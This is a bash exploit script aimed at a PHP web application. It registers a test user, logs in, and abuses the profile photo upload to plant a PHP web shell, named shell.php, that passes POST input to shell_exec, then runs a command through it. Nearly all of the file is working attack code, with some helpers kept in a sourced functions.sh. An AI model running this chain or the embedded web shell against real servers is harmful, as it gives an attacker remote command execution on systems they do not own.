#!/usr/bin/bash
source "./functions.sh"

shell_code="<?php if (!empty(\$_POST['cmd'])) { \$cmd = shell_exec(\$_POST['cmd']); echo \$cmd; } ?>"
default_user_profile="test_user:ivan:ivanov:ivan@gmail.com:123456"
default_shell_name="shell.php"
default_cmd="id"

if [ "$#" == 0 ]; then
	usage
	exit 1
fi
while getopts "h:d:" opt; do
	case "$opt" in
		d)
			domain="$OPTARG"
			;;
		h)
			ip="$OPTARG"
			;;
		*)
			usage
			exit 1
			;;
	esac
done

code_response=$(register_user $ip "/register.php" $default_user_profile)
if [[ ${code_response} != "302" ]]; then
	echo "[register user] bad request"
	exit 1
fi

res=$(login_user $ip $domain /includes/login.php $default_user_profile)
sesssion_id=${res#*:}
code_response=${res//:*/}
if [[ $code_response != "302" ]]; then
	echo "[login user] bad request"
	exit 1
fi
upload_photo $ip "/admin/profile.php?section=alex" $sesssion_id $default_user_profile $default_shell_name

sleep 1; cmd_shell $ip $domain $default_shell_name $default_cmd


